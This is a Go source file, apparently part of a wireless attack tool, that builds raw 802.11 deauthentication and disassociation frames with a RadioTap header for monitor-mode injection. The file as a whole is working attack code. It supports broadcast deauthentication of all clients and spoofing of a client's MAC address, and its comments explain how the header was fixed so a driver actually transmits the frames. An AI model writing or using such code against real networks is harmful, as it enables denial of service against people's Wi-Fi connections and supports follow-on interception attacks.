package drone

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
)

// Reason codes per IEEE 802.11
const (
	ReasonUnspecified             uint16 = 1
	ReasonPrevAuthNotValid        uint16 = 2
	ReasonDeauthLeaving           uint16 = 3
	ReasonDisassocDueToInactivity uint16 = 4
	ReasonDisassocAPBusy          uint16 = 5
	ReasonClass2FromNonAuthSTA    uint16 = 6
	ReasonClass3FromNonAssocSTA   uint16 = 7
	ReasonDisassocLeaving         uint16 = 8
)

// FrameOptions controls how a management frame is built.
type FrameOptions struct {
	// Channel is the 2.4 GHz channel the frame will be injected on. The rate
	// and frequency fields must agree with the radio, otherwise mt76 accepts
	// the frame and transmits nothing.
	Channel int
	// RateMbps is the PHY rate in 802.11 Mbps units (1, 2, 5.5, 6, 11, ...).
	RateMbps float64
	// Reverse impersonates the client: Addr2 becomes the client MAC and
	// Addr1 the AP, which makes the AP process a deauth/disassoc "from" the
	// station. Only meaningful with a unicast client.
	Reverse bool
	// Disassoc sends a Disassociation frame (subtype 10) instead of a
	// Deauthentication frame (subtype 12).
	Disassoc bool
}

// DefaultFrameOptions is a conservative 2.4 GHz channel 1 / 1 Mbps profile.
func DefaultFrameOptions() FrameOptions {
	return FrameOptions{Channel: 1, RateMbps: 1}
}

// BuildDeauthFrame creates a deauthentication frame with the default options.
func BuildDeauthFrame(bssidStr, clientStr string, reasonCode uint16) (string, error) {
	return BuildManagementFrame(bssidStr, clientStr, reasonCode,
		DefaultFrameOptions())
}

// BuildManagementFrame creates a deauth/disassoc frame wrapped in a complete
// 16-byte RadioTap header.
//
// The previous builder emitted an 8-byte header with an empty present bitmap.
// mt76 then had no rate/channel information and silently dropped the frame:
// SEND_INJECTION reported success while nothing reached the air. The header
// below carries Flags, Rate, Channel and TX flags, which is what the driver
// needs for monitor-mode injection:
//
//	it_version 0 | it_pad 0 | it_len 16 (LE)
//	it_present 0x0000001e -> Flags(1), Rate(2), Channel(3), TX flags(4)
//	Flags      0x00
//	Rate       rate*2 (500 kbps units)
//	Channel    freq (LE) + channel flags
//	TX flags   0x0010 (NO_ACK) — management frames are not acked here
//
// 802.11 MAC frame:
//
//	Frame Control: 0x00c0 deauth / 0x00a0 disassoc
//	Duration:      0x0000
//	Addr1:         client (or BSSID when Reverse)
//	Addr2:         BSSID  (or client when Reverse)
//	Addr3:         BSSID
//	Seq-Control:   0x0000
//	Reason Code:   2 bytes little-endian
func BuildManagementFrame(bssidStr, clientStr string, reasonCode uint16,
	opts FrameOptions) (string, error) {

	bssid, err := net.ParseMAC(bssidStr)
	if err != nil {
		return "", fmt.Errorf("invalid BSSID MAC: %w", err)
	}

	var client net.HardwareAddr
	broadcast := clientStr == "" || clientStr == "ff:ff:ff:ff:ff:ff" ||
		clientStr == "FF:FF:FF:FF:FF:FF"
	if broadcast {
		client = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	} else {
		client, err = net.ParseMAC(clientStr)
		if err != nil {
			return "", fmt.Errorf("invalid Client MAC: %w", err)
		}
	}

	channel := opts.Channel
	if channel < 1 || channel > 14 {
		channel = 1
	}
	rate := opts.RateMbps
	if rate <= 0 {
		rate = 1
	}
	rateField := byte(rate * 2)
	if rateField == 0 {
		rateField = 2 // 1 Mbps
	}

	frame := make([]byte, 0, 16+24+2)

	// 1. RadioTap header (16 bytes, fields present: Flags/Rate/Channel/TX).
	frame = append(frame,
		0x00, 0x00, // version, pad
		0x10, 0x00, // it_len = 16
		0x1e, 0x00, 0x00, 0x00, // present: bits 1..4
		0x00,      // Flags
		rateField, // Rate (500 kbps units)
	)
	freq := 2412
	if channel == 14 {
		freq = 2484
	} else {
		freq = 2407 + channel*5
	}
	var chbuf [4]byte
	binary.LittleEndian.PutUint16(chbuf[0:2], uint16(freq))
	binary.LittleEndian.PutUint16(chbuf[2:4], 0x00a0) // 2 GHz, CCK
	frame = append(frame, chbuf[:]...)
	frame = append(frame, 0x10, 0x00) // TX flags: NO_ACK

	// 2. 802.11 management header.
	fc := byte(0xc0) // Deauthentication
	if opts.Disassoc {
		fc = 0xa0 // Disassociation
	}
	frame = append(frame, fc, 0x00)   // Frame Control
	frame = append(frame, 0x00, 0x00) // Duration

	tx, rx := bssid, client
	if opts.Reverse && !broadcast {
		tx, rx = client, bssid
	}
	frame = append(frame, rx...)    // Addr1: receiver
	frame = append(frame, tx...)    // Addr2: transmitter
	frame = append(frame, bssid...) // Addr3: BSSID

	frame = append(frame, 0x00, 0x00) // Sequence Control
	frame = append(frame, byte(reasonCode&0xff), byte((reasonCode>>8)&0xff))

	return hex.EncodeToString(frame), nil
}
